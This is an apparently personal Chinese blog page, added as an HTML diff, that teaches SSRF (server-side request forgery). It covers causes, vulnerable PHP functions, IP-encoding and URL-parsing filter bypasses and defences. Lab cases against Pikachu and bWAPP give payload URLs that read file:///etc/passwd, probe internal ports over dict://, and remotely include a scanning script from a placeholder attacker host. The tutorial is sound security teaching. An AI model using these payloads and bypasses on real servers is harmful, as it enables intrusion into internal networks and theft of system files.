@@ -1,0 +1,359 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title> | 剣の魔王の小窝</title>
+    <meta name="author" content="剣の魔王" />
+    <meta name="description" content="这个网站没有描述" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/head.png" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.css" />
+<script src="/js/lib/math.js"></script>
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<script src="https://cdn.staticfile.org/animejs/3.2.1/anime.min.js"></script>
+<link rel="stylesheet" href="/css/main.css" />
+<link rel="preconnect" href="https://static-argvchs.netlify.app" />
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+
+			<canvas
+			id="fireworks"
+			style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: 32767">
+			</canvas>
+			<script src="https://s4.zstatic.net/ajax/libs/animejs/3.2.1/anime.min.js"></script>
+			<script src="/js/lib/fireworks.min.js"></script>
+			
+			<canvas
+			id="background"
+			style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: -1"></canvas>
+			<script src="/js/lib/background.min.js"></script>
+
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>剣の魔王の小窝</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;剣の魔王の小窝</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1></h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/5/5
+        </span>
+        
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h3 id="SSRF漏洞原理"><a href="#SSRF漏洞原理" class="headerlink" title="SSRF漏洞原理"></a>SSRF漏洞原理</h3><p>SSRF (Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成,由服务端发起请求的一个安全漏洞。<br>很多Web应用都提供了从其他服务器上获取数据的功能。使用用户指定的URL，Web应用可以获取url中的图片，下文件，读文件等。<br>攻击者可以利用存在缺陷的web应用作为代理攻击远程和本地服务器。一般SSRF攻击的目标是从外网无法访问的内部系统。</p>
+<h4 id="SSRF形成原因"><a href="#SSRF形成原因" class="headerlink" title="SSRF形成原因"></a>SSRF形成原因</h4><p>SSRF漏洞形成的原因大多是因为服务端提供了从其他[服务器/应用]获取数据的功能,且没有对目标地址作过滤和限制。<br>比如从指定URL地址获取网页文本内容，加载指定地址的图片，文档等等。<span id="more"></span></p>
+<blockquote>
+<p>比如 ：<br>A 网站是所有人都可以访问的外网网站，A能与B通信，B 网站是一个他们内部的网站<br>我们普通用户只可以访问 a 网站，不能访问 b 网站。<br>但是我们可以同过a网站做中间人，访问 b网站，从而达到攻击 b 网站需求</p>
+</blockquote>
+<p>所以一般攻击是选择一台可以由我们访问的存在漏洞的外网服务器（作为跳板机）</p>
+<p>正常用户访问网站的流程是<br>输入 A 网站 URL –&gt; 发送请求 –&gt; A 服务器接受请求（没有过滤），并处理 –&gt;返回用户响应<br>产生的原因：服务器端的验证并没有对其请求获取图片的参数（image=）做出严格的过滤以 及限制，导致 A 网站可以从其他服务器的获取数据</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240415-192039.png" alt="在这里插入图片描述"></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240415-192133.png" alt="在这里插入图片描述"></p>
+<h4 id="SSRF的用途："><a href="#SSRF的用途：" class="headerlink" title="SSRF的用途："></a>SSRF的用途：</h4><p>攻击者利用ssrf可以实现的攻击主要有5种</p>
+<ol>
+<li>可以对外网、服务器所在内网、本地进行端口扫描<br>获取一些服务的banner信息</li>
+<li>攻击运行在内网或本地的应用程序<br>比如溢出</li>
+<li>对内网web应用进行指纹识别<br>通过访问默认文件实现</li>
+<li>攻击内外网的web应用<br>主要是使用get参数就可以实现的攻击（比如struts2，sqli等）</li>
+<li>利用file协议读取本地文件等</li>
+</ol>
+<p>各个协议调用探针：http,file,dict,ftp,gopher 等<br>漏洞攻击：端口扫描，指纹识别，漏洞利用，内网探针等</p>
+<pre><code>http://192.168.64.144/phpmyadmin/
+file:///D:/www.txt
+dict://192.168.64.144:3306/info
+ftp://192.168.64.144:21
+</code></pre>
+<p>内网探针：通过服务端请求其内网中的信息，内网穿透过去，通过协议，http，file，ftp，等<br>在内网中是没有办法直接请求信息的，通过访问网站实现跳板，来对内网实现攻击<br>内网IP地址是私有的，IP端并不多，做一个字典可以跑。<br>攻击的不是真实内网去，而是去打一些藏在内网中的服务，比如数据库被放在内网中无法提取，邮件服务器，隧道，代理等等等等</p>
+<h4 id="SSRF漏洞出没位置"><a href="#SSRF漏洞出没位置" class="headerlink" title="SSRF漏洞出没位置"></a>SSRF漏洞出没位置</h4><p>注：个人觉得<strong>所有调外部资源的参数都有可能存在ssrf漏洞</strong></p>
+<ol>
+<li>分享：通过URL地址分享网页内容</li>
+<li>转码服务</li>
+<li>在线翻译</li>
+<li>图片加载与下载：通过URL地址加载或下载图片</li>
+<li>图片、文章收藏功能</li>
+<li>未公开的api实现以及其他调用URL的功能</li>
+<li>从URL关键字中寻找<br>share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain等</li>
+</ol>
+<p>例如： <a target="_blank" rel="noopener" href="http://www.xxx.com/xxx.php?image=www.lucity.com/1.jpg">www.xxx.com/xxx.php?image=www.lucity.com/1.jpg</a><br>如果我们将 <a target="_blank" rel="noopener" href="http://www.lucity.com/1.jpg">www.lucity.com/1.jpg</a> 换为与该服务器相连的内网服务器地址会产生什么<br>在存在漏洞的情况想，如果存在该内网地址就会返回 1xx 2xx 之类的状态码，不存在就会其他的状态码</p>
+<h3 id="SSRF绕过与防护"><a href="#SSRF绕过与防护" class="headerlink" title="SSRF绕过与防护"></a>SSRF绕过与防护</h3><h4 id="SSRF常用的后端实现"><a href="#SSRF常用的后端实现" class="headerlink" title="SSRF常用的后端实现"></a>SSRF常用的后端实现</h4><p>ssrf 攻击可能存在任何语言编写的应用，代码审计中要注意以下函数</p>
+<ol>
+<li>file_get_contents<br>从用户指定的 url 获取图片，然后把它用一个随机文 件名保存在硬盘上，并展示给用户</li>
+<li>fsockopen()<br>实现获取用户制定 url 的数据（文件或者 html）。这个函数会 使用 socket 跟服务器建立 tcp 连接，传输原始数据</li>
+<li>curl_exec()<br>用来获取数据</li>
+</ol>
+<h4 id="绕过手法"><a href="#绕过手法" class="headerlink" title="绕过手法"></a>绕过手法</h4><p><strong>更改 IP 地址写法</strong><br>一些开发者会通过对传过来的 URL 参数进行正则匹配的方式来过滤掉内网 IP，如采用如下正则表达式：</p>
+<pre><code>^10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d))&#123;3&#125;$
+^172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d))&#123;2&#125;$
+^192\.168(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d))&#123;2&#125;$
+</code></pre>
+<p>对于这种过滤我们可以采用改编 IP 的写法的方式进行绕过，例如 192.168.0.1 这个 IP 地址<br>我们可以改写成：<br>(1)、8 进制格式：0300.0250.0.1<br>(2)、16 进制格式：0xC0.0xA8.0.1<br>(3)、10 进制整数格式：3232235521<br>(4)、16 进制整数格式：0xC0A80001</p>
+<p><strong>利用解析 URL 所出现的问题</strong><br>在某些情况下，后端程序可能会对访问的 URL 进行解析，对解析出来的 host 地址进行过滤。这时候可能会出现对 URL 参数解析不当，导致可以绕过过滤。<br>随意地址+攻击地址：<code>http://www.baidu.com@192.168.0.1/</code><br>当后端程序通过不正确的正则表达式（比如将 http 之后到 com 为止的字符内容，也就是 <a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a>，认为是访问请求的 host 地址时）对上述 URL 的内容进行解析的时候， 很有可能会认为访问 URL 的 host 为 <a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a>，而实际上这个 URL 所请求的内容是192.168.0.1 上的内容。</p>
+<h4 id="SSRF-防护方法"><a href="#SSRF-防护方法" class="headerlink" title="SSRF 防护方法"></a>SSRF 防护方法</h4><p>1、防护措施<br>（黑名单）<br>（1）过滤 10.0.0.0/8 、172.16.0.0/12、192.168.0.0/16、localhost 私有地址、IPv6 地址<br>（2）过滤 file:///、dict://、gopher://、ftp:// 危险 schema<br>（3）对返回的内容进行识别<br>（4）内网服务开启鉴权（Memcached, Redis, Elasticsearch and MongoDB）</p>
+<p>2、最佳防护</p>
+<ol>
+<li>使用地址白名单</li>
+<li>对返回内容进行识别</li>
+<li>需要使用互联网资源（比如贴吧使用网络图片）而无法使用白名单的情况：<br>首先禁用<code>CURLOPT_FOLLOWLOCATION</code>；<br>然后通过域名获取目标ip，并过滤内部 ip；<br>最后识别返回的内容是否与假定内容一致</li>
+</ol>
+<h3 id="SRF案例："><a href="#SRF案例：" class="headerlink" title="SRF案例："></a>SRF案例：</h3><h4 id="案例一：url没过滤"><a href="#案例一：url没过滤" class="headerlink" title="案例一：url没过滤"></a>案例一：url没过滤</h4><pre><code># 源代码如下
+if(isset($_GET[&#39;url&#39;]) &amp;&amp; $_GET[&#39;url&#39;] != null)&#123;
+    //接收前端URL没问题,但是要做好过滤,如果不做过滤,就会导致SSRF
+    $URL = $_GET[&#39;url&#39;];
+    $CH = curl_init($URL);
+    curl_setopt($CH, CURLOPT_HEADER, FALSE);
+    curl_setopt($CH, CURLOPT_SSL_VERIFYPEER, FALSE);
+    $RES = curl_exec($CH);
+    curl_close($CH) ;
+//ssrf的问是:前端传进来的url被后台使用curl_exec()进行了请求,然后将请求的结果又返回给了前端。
+//除了http/https外,curl还支持一些其他的协议curl --version 可以查看其支持的协议,telnet
+//curl支持很多协议，有FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE以及LDAP
+    echo $RES;
+&#125;
+</code></pre>
+<p><strong>此时可以在url后边接任意地址，当然真正的渗透应该接目标的内网地址</strong></p>
+<pre><code>#原地址：
+http://localhost/pikachu/vul/ssrf/ssrf_curl.php?url=http://localhost/1.txt
+#直接替换url为任意网址或本地文件路径
+http://localhost/pikachu/vul/ssrf/ssrf_curl.php?url=http://www.baidu.com
+http://localhost/pikachu/vul/ssrf/ssrf_curl.php?url=file:///etc/passwd
+</code></pre>
+<h4 id="案例二：只读取PHP文件"><a href="#案例二：只读取PHP文件" class="headerlink" title="案例二：只读取PHP文件"></a>案例二：只读取PHP文件</h4><p><code>file_get_contents</code>函数只能读取PHP文件，所以可以修改原本的路径，读取服务器其他的php文件</p>
+<pre><code>http://localhost/pikachu/vul/ssrf/ssrf_fgc.php?file=http://127.0.0.1/pikachu/vul/ssrf/captain.php
+</code></pre>
+<h4 id="案例三：文件包含"><a href="#案例三：文件包含" class="headerlink" title="案例三：文件包含"></a>案例三：文件包含</h4><p>利用文件包含漏洞，加载远程脚本扫描内部服务</p>
+<pre><code>#GET的请求：
+http://192.168.163.157/bWAPP/rlfi.php?language=lang_en.php&amp;action=go
+#观察Get请求中的参数，发现是典型文件包含问题，language=lang_en.php
+#使用如下payload，远程包含并执行扫描脚本探测内网主机的端口和服务。
+
+#POST请求
+http://192.168.163.157/bWAPP/rlfi.php?language=http://xxx.xxx.xxx/bWAPP/ssrf-1.txt&amp;action=go
+#POST DATA内容：
+ip=192.168.60.70
+</code></pre>
+<blockquote>
+<p>192.168.163.157是要访问的主机地址A<br>xxx.xxx.xxx是要使用的远程扫描脚本的地址（也就是自己搭建的服务器）<br>192.168.60.70是要扫描的目标主机内网地址B，且该地址是xxx.xxx.xxx主机无法访问到的<br>使用post请求提交要进行扫描的目标主机IP，扫描结束后便返回结果。</p>
+</blockquote>
+<p>参考链接：</p>
+<p><a target="_blank" rel="noopener" href="https://www.kancloud.cn/noahs/src_hacker/2395018">SSRF原理基础 · 白帽与安全 · 看云 (kancloud.cn)</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_74169008/article/details/130768550">【小迪安全】完整详细笔记01-39天-CSDN博客</a></p>
+
+    </div>
+    
+    
+    
+    
+    <div id="comment">
+        <div id="giscus-container" class="giscus"></div>
+    </div>
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 剣の魔王の小窝
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;剣の魔王
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    <script>
+        console.info("Welcome to Argvchs' blog!");
+        if (!window.hasOwnProperty("ontouchstart")) {
+            let html = '<canvas id="fireworks" style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: 32767"></canvas><script src="https://static-argvchs.netlify.app/js/fireworks.min.js"><\/script>';
+            document.body.append(document.createRange().createContextualFragment(html));
+        }
+    </script>
+    
+    
+<script
+    src="https://giscus.app/client.js"
+    data-repo="argvchs/giscus-comments"
+    data-repo-id="R_kgDOI_uC-w"
+    data-category="Announcements"
+    data-category-id="DIC_kwDOI_uC-84CUToF"
+    data-mapping="pathname"
+    data-strict="1"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="bottom"
+    data-theme="https://static-argvchs.netlify.app/css/giscus.css"
+    data-lang="zh-CN"
+    crossorigin
+    async
+></script>
+
+
+
+
+
+    
+</body>
+</html>
